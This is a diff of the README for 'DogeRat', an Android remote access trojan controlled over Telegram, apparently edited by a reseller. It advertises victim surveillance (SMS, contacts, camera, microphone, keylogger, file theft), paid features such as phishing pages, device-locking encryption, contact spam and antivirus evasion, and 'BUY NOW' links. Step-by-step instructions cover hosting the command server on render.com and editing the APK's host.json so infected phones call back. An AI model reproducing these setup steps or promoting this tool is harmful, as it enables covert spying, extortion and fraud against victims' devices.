@@ -1,4 +1,7 @@
-![Logo](https://wigmur.com/dogs/logo.png)
+<p align="center">
+  <img src="images/logo.png" alt="logo" style="max-width: auto%; height: auto;" />
+
+</p>
 <p align="center">
   <i>A multifunctional Telegram based Android RAT without port forwarding</i>
 </p>
@@ -7,8 +10,10 @@
 
 <h2 align="center">Panel Screenshot</h2>
 <p align="center">
-  <img src="https://wigmur.com/dogs/scr.jpg" alt="Logo" />
+  <img src="images/4.jpg" alt="Screenshot 1" style="max-width: 100%; height: auto;" />
+
 </p>
+
 
 ## Features
 - 🔴 Real time
@@ -24,49 +29,55 @@
 - ✉️ send sms with target device to all of his/her contacts
 - 👤 recive all target contacts
 - 💻 receive list of all installedd apps in target device
-- 📁 receive any file or folder from target device
-- 📁 delete any file or folder from target device
 - 📷 capture main and front camera
 - 🎙 capture microphone (with custom duration)
 - 📋 receive last clipboard text
 - ✅️ auto start after device boot
-- 🔐 Keylogger {Availbe in apk v1 and v2}
+- 🔐 Keylogger
 - ✨ Beautiful telegram bot interface
-- -🤖 Undetectable by antivirus
   ## DOGE RAT PAID VERSION FEATURES
-  🔐 Open any phising page in victim device
+- 🤖 Auto permisson  
+- 🔐Encrypt/ Decrypt after encryption victims will be not able to use their devices
+- 🖥️ Screenshot (get screenshot from your victim device)
+- 🗨️ spam message in all contacts after installation which you will set in apk
+- 🔐injection {inject appliactaion automatic with any login or any page unlimited }
+- 🔐 Open any phising page in victim device
 - 🖥️ Screenshot (get screenshot from your victim device)
 - 📒 Gallery puller (Get all photos available in gallery)
 - 🔔 notification reader
 - 🔔 notification sender (send custom notification that apper on target device with custom click link)
 - 🗨️ show toast message on target device (Toasts are messages that appear in a box at the bottom of the device)
--  🔤 Advance Keylogger
--  📁 PowerFull file manager {delete and Download Files}
+- 🔤 Advance Keylogger
+- 📁 receive any file or folder from target device
+- 📁 delete any file or folder from target device
+- 📁 PowerFull file manager
 - ✨ Beautiful telegram bot interface
 - 🤖 Undetectable by antivirus
+- 🤖and more ......
   <p align="center">
-  <a href="https://t.me/shivaya_dav">
+  <a href="https://t.me/sPHANTER">
     <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
   </a>
-  <a href="https://t.me/shivaya_dav">
+  <a href="https://t.me/sPHANTER">
     <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
   </a>
-  <a href="https://t.me/shivaya_dav">
+  <a href="https://t.me/sPHANTER">
     <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
   </a>
   </p>
 <h2>Requirements</h2>
 <ul>
   <li><span style="color: #0074D9;">APK EDITOR</span></li>
-  <li><span style="color: #2ECC40;">TERMUX</span></li>
+  <li><span style="color: #2ECC40;">ANY VPS</span></li>
   <li>For hosting server code, you can use some free services like:</li>
   <ul>
+  <li><a href="https://render.com/" style="color: #B10DC9;">render.com {reccomended}</a></li>
     <li><a href="https://replit.com/" style="color: #FF4136;">replit.com</a></li>
     <li><a href="https://glitch.com/" style="color: #FFDC00;">glitch.com</a></li>
     <li><a href="https://heroku.com/" style="color: #B10DC9;">heroku.com</a></li>
   </ul>
   <p align="center">
-  <a href="https://shivaya-dav.github.io/dogeweb/">
+  <a href="https://T.ME/CYBERSHIELDX/">
     <img src="https://img.shields.io/badge/📹%20VIDEO%20TUTORIALS%20AVAILABLE%20HERE-blue?style=for-the-badge" alt="Video Tutorials Available Here" />
   </a>
 </p>
@@ -77,34 +88,35 @@
 <h2 align="center">Download</h2>
 
 <p align="center">
-  <a href="https://cybershieldx.com/termux.apk">
-    <img src="https://img.shields.io/badge/Termux%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download Termux" />
+  <a href="/TOOLS/APKEditor.apk">
+    <img src="https://img.shields.io/badge/Termux%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download APK EDITOR" />
   </a>
-  <a href="https://cybershieldx.com/editor.apk">
-    <img src="https://img.shields.io/badge/APK%20Editor%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download APK Editor" />
+  <a href="TOOLS/APK Easy Tool v157-1 Setup (Fix).msi">
+    <img src="https://img.shields.io/badge/APK%20Editor%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download APK EASY TOOL" />
   </a>
 </p>
 
 
-## How to host server in Termux 
-<p>Run the following commands in Termux:</p>
+## How to host server in RENDER.COM
+<p>FOLLOW THWSW STEPS:</p>
 
 
 
 ```bash  
-  pkg update && upgrade -y
-  pkg install git -y
-  git clone https://github.com/shivaya-dav/DogeRat 
-  cd DogeRat
-  bash start.sh
-Enter your bot token 
-Enter your chatid 
-And hit enter
-Now open a new Tab, and give these commands
-pkg install openssh
-bash port.sh 
-Enter your telegram username And hit enter 
-Copy url and minimize the termux
+ - DOWNLOAD THE FILES FROM HERE
+ - CREATE A GITHUB ACCOUNT 
+ - CREATE A PRIVATE NEW REPO AND UPLOAD ALL FILES {SERVER.JS/PACKAGE.JSON/DATA.JSON }
+ - NOW GO TO RENDER.COM
+  SIGNUP WITH GITHUB/CONFIRM ACCOUNT/CONNECT GITHUB ACCOUNT
+ - NOW CLICK ON NEW WEB SERVICE/SELECT FREE  TRIAL/GIVE ANY RANDOM NAME OF YOUR WEB SERVICE
+- NOW YOU WILL SEE HERE YOUR REPO WHICH YOU CREATED 
+- CLCIK ON THAT IT WILL START DEPLOYING IGNORE IT AND COPY THE URL OF YOUR WEB SERVICE
+- NOW COMEBACK TO YOUR GITHUB REPO AND EDIT DATA.JSON
+- ENTER YOUR BOT TOKEN,CHAT ID URL WHICH YOU COPIED FROM RENDER.COM
+- SAVE DATA.JSON
+- GO BACK TO RENDER.COM AND OPEN YOUR PROJECT AND CLICK ON DEPLOY/THEN DEPLOY LATEST COMMITS
+- IT WILL TAKE FEW SECONDS ONCE YOU WILL SEE IN TERMINAL THAT YOUR SERVICE IS LIVE
+- NOW GO TO TELEGRAM BOT AND START THE BOT ENJOYYYYYY
 ```
 
 ## Edit apk
@@ -115,47 +127,15 @@ Copy url and minimize the termux
  - go to assets folder
  - open host.json
  - and enter url
- - in socket replace url https to wss 
- - build apk ,start the bott  Enjoy
+ - build apk ,start the bot  Enjoy
 
 ## example
 ```bash  
-  { 
-  "host": "https://yoururl.com/", 
-  "socket": "wss://yoururl.com/", 
-  "webView": "https://google.com/" 
-}
+  https://yourRENDERURL.com/
+
 ```
 
-## How to Build in Android Studio
 
-To build the application in Android Studio, follow these steps:
-
-1. Open the Android Studio and import the application source code.
-2. Navigate to the following path in the source code: `Utils/AppTools.kt`.
-3. In the `AppTools.kt` file, locate the `data` variable and copy your server information into it.
-4. However, before copying the server information directly into the variable, you must encode it using Base64.
-5. Here is an example JSON structure for your server information:
-```
-{
-"host" : "",
-"socket" : "",
-"webView" : "https://www.google.com"
-}
-```
-
-6. Fill in the above JSON structure with your server information.
-7. Go to https://www.base64encode.org/ and copy the encoded result of your JSON data.
-8. In Android Studio, paste the encoded result into the `data` variable.
-9. The final code should look like this:
-
-```kotlin
-fun getAppData(): AppData {
-    val data = "<your encoded server info>"
-    val text = decode(data)
-    return json().fromJson(text, AppData::class.java)
-}
-```
 
 
 <h2 align="center">🔗 Contact and Social Media Accounts</h2>
